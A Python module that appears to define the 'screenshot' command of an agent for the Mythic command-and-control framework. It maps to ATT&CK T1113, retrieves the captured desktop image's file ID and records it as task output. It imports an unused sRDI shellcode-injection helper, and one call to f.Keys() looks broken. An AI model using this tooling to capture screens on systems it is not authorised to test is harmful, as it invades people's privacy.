from mythic_payloadtype_container.MythicCommandBase import *
from uuid import uuid4
import json
from os import path
from mythic_payloadtype_container.MythicRPC import *
from sRDI import ShellcodeRDI
import base64

class ScreenshotArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
        }

    async def parse_arguments(self):
        pass


class ScreenshotCommand(CommandBase):
    cmd = "screenshot"
    needs_admin = False
    help_cmd = "screenshot [pid] [x86/x64]"
    description = "Take a screenshot of the current desktop."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@reznok"
    argument_class = ScreenshotArguments
    browser_script = BrowserScript(script_name="screenshot", author="@djhohnstein")
    attackmapping = ["T1113"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass

    async def screenshot_completed(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
        if task.status == MythicStatus.Success:
            responses = await MythicRPC().execute(
                "get_responses",
                task_id=task.id,
            )
            file_id = ""
            for f in responses["files"]:
                if "agent_file_id" in f.Keys() and f["agent_file_id"] != "" and f["agent_file_id"] != None:
                    file_id = f["agent_file_id"]
                    break
            if file_id == "":
                task.status = MythicStatus.Failed
                return task
            else:
                resp = await MythicRPC().execute(
                    "create_output",
                    task_id=task.id,
                    output=file_id)
                if resp.status != MythicStatus.Success:
                    raise Exception("Failed to create output")

        return task
